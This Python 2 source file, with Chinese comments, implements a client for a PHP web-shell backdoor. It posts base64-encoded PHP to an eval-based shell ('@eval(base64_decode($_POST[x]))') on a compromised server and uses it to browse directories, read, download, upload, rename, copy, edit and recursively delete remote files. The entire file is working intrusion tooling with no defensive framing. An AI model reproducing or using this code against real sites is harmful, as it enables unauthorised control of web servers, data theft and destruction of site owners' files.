#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''

import os
import sys
import urllib
import urllib2
import requests
import base64
import re
from tools import *



class phpshell:
    sitepath = ""
    shellpass = ""
    url = ""
    initcode = "@eval(base64_decode($_POST[x]));&x="

    def __init__(self, url, shellpass):
        code = '''
        echo dirname(__FILE__);
        '''.strip()
        self.shellpass = shellpass
        self.url = url
        data = {shellpass : code}
        self.initcode = "{0}={1}".format(shellpass,self.initcode)
        try:
            html = Spider.post(url, data)
        except:
            printf("The network Error or url is not valid")
            sys.exit()
        self.sitepath =  (html+os.sep).replace('\\', '\\\\')   
        print self.sitepath
    
    #浏览文件目录
    def GetFilePath(self, path=None):
        phpcode = self.initcode
        path = CorrectPath(path, self.sitepath)
        filelist = re.compile(r'file:([\s\S]+?)\stime:([\s\S]+?)\ssize:(\d+?)\sperm:(\d{4})')
        code = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");
        ;$D=%s;$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}
        else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T="time:".@date("Y-m-d H:i:s",@filemtime($P));
        @$E="perm:".substr(base_convert(@fileperms($P),10,8),-4);$R=" ".$T." size:".@filesize($P)." ".$E."
        ";if(@is_dir($P))$M.="file:".$N."/".$R;else $L.="file:".$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();
        ''' % "'{0}'".format(path.replace('\\', '\\\\')).strip()  #发送的php代码
        phpcode += "{0}".format(base64.b64encode(code))
        order = Spider.oldpost(self.url, phpcode)
        if order == '-|ERROR:// Path Not Found Or No Permission!|<-':
            print "Error: Path Not Found Or No Permission!"
            return False
        else:
            self.ShowRule(filelist.findall(order))

    #删除文件
    def DeleteFile(self, file):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;
        if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);
        }if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m-close();@chmod($p,0777);
        return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
        if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};echo("|<-");die();
        '''
        file = CorrectPath(file, self.sitepath)
        phpcode = self.initcode
        phpcode += "{0}&{1}".format(base64.b64encode(code), urllib.urlencode({"z1": file}))
        data = Spider.oldpost(self.url, phpcode)
        if "-|1|<-" in data:
            printf("Delete File Ok!")


    #上传文件
    def UploadFile(self, localfile, remotepath=None):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;$f=base64_decode($_POST["z1"]);$c=$_POST["z2"];$c=str_replace("\r","",$c);
        $c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));
        echo(@fwrite(fopen($f,"wb"),$buf)?"1":"0");;echo("|<-");die();
        '''.strip()
        #注意 远程和本地都需要指定到文件名
        filename = getfilename(localfile)
        remotepath = CorrectPath(remotepath , self.sitepath) + filename
        phpcode = self.initcode
        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotepath))
        with open(localfile, 'rb') as file:
            data = file.read()                
        filestream = ""
        for line in range(len(data)):
            filestream += "%02x" % ord(data[line])
        phpcode += "&z2={0}".format(filestream)
        result = Spider.oldpost(self.url, phpcode)
        if "-|1|<-" in result:
            printf("Upload File Ok!")

    #重命名文件 TODO 
    def RenameFile(self,oldname,newname):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;$m=get_magic_quotes_gpc();
        $src=m?stripslashes($_POST["z1"]):$_POST["z1"];
        $dst=m?stripslashes($_POST["z2"]):$_POST["z2"];
        echo(rename($src,$dst)?"1":"0");
        ;echo("|<-");die();
        '''
        phpcode = self.initcode            
        oldname = CorrectPath(oldname, self.sitepath)
        print newname
        newname = getonepath(oldname) +os.sep + newname
        print newname
        phpcode += "{0}&z1={1}&z2={2}".format(base64.b64encode(code), oldname, newname)
        result = Spider.oldpost(self.url, phpcode)
        if "1" in result:
            printf("rename file ok")


    #读取文件
    def ReadFile(self, file):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("\r\n");;$F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
        @fclose($P);;echo("\r\n");die();
        '''
        phpcode = self.initcode
        file = CorrectPath(file, self.sitepath)
        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(file))
        data = Spider.oldpost(self.url, phpcode)
        print data

    #下载文件
    def DownloadFile(self, remotefile, localfile=None):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        $F=base64_decode($_POST["z1"]);file_exists($F)?1:exit();$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
        @fclose($P);;die();
        '''
        phpcode = self.initcode
        remotefile = CorrectPath(remotefile, self.sitepath)
        localfile = getfilename(remotefile)
        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotefile))
        data = Spider.oldpost(self.url, phpcode)
        if data == "":
            printf("No this file")
        else:
            self.filesave(data, localfile)
            printf("download file ok")

    #移动文件
    def CopyFile(self, sourcepath, descpath=None):
        sourcepath = CorrectPath(sourcepath, self.sitepath)
        phpcode = '@eval(base64_decode($_POST[x]));&x='
        if descpath == None or getfilename(descpath) == "":  #网站根目录
            descpath = CorrectPath(descpath, self.sitepath) + getfilename(sourcepath)
        else:  #指定路径和文件名
            descpath = CorrectPath(descpath, self.sitepath)
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");;
        $m=get_magic_quotes_gpc();$fc=base64_decode($_POST["z1"]);
        $fp=base64_decode($_POST["z2"]);function xcopy($src,$dest){if(is_file($src))
        {if(!copy($src,$dest))return false;else return true;}$m=@dir($src);if(!is_dir($dest))
        if(!@mkdir($dest))return false;while($f=$m->read()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;
        if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){if(!xcopy($isrc,$idest))return false;}
        else if(is_file($isrc)){if(!copy($isrc,$idest))return false;}}return true;}echo(xcopy($fc,$fp)?"1":"0");
        ;echo("|<-");die();'''.strip()
        # phpcode = self.initcode
        phpcode += "{0}&z1={1}&z2={2}".format(base64.b64encode(code), base64.b64encode(sourcepath),base64.b64encode(descpath))
        self.filesave(phpcode, 'copy2.txt')
        data  ={self.shellpass:phpcode}
        result = Spider.post(self.url, data)
        print result
        if "1" in result:
            printf("copy file ok")

    def EditFile(self, file):
        filename = os.path.basename(file)
        filepath = os.path.dirname(CorrectPath(file, self.sitepath)) + os.sep 
        self.DownloadFile(file, filename)
        editor =  'notepad' if IsWin() else 'vim'
        cmd = "{0} {1}".format(editor, filename)
        execcmd(cmd)
        self.UploadFile(filename, filepath)
        os.remove(filename)

    def ShowRule(self, list):
        string = "total: {0}\nperm\t\tsize\t\tdate\t\tfile\n".format(len(list))
        for line in list:
            string += "{0}".format(self.showrwx(line[3][1]) + self.showrwx(line[3][2]) + self.showrwx(line[3][3]))
            string += "\t{0}".format(line[2])
            string += "\t{0}".format(line[1])
            string += "\t{0}\n".format(line[0])
        print string

    def showrwx(self, num):
        permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
        if num in permx.keys():
            return permx[num]
        elif num == 3 :
            return "-wx"
        elif num == 5:
            return "r-x"
        elif num == 6:
            return "rw-"
        else:
            return "rwx"
        return string

    def filesave(self, data, name):
        with open(name, 'wb') as file:
            file.write(data)

    def filesave2(self, data):
        with open("test.txt", 'wb') as file:
            file.write(data)
    
    
    